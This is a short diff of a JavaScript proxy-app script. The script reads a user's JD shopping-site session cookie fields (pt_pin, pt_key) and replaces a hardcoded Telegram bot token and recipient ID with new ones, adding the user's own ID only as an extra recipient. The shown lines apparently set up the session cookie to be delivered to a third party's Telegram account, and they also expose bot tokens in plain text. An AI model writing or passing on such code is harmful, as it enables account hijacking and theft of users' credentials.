@@ -40,8 +40,8 @@ const pin = CK.match(/pt_pin=(.+?);/)[1];
 const key = CK.match(/pt_key=(.+?);/)[1];
 const _TGUserID = $.getData('id77_TGUserID');
 
-$.TGBotToken = '1825234231:AAEcJUh6jJ93zDd19XH9fl2cSzPiNVBX4xI';
-$.TGUserIDs = [431789620];
+$.TGBotToken = '1701023472:AAG_uBA0rbadjNUJCPLA2VvL7KTOdYEnU0E';
+$.TGUserIDs = [1714300679];
 if (_TGUserID) {
   $.TGUserIDs.push(_TGUserID);
 }
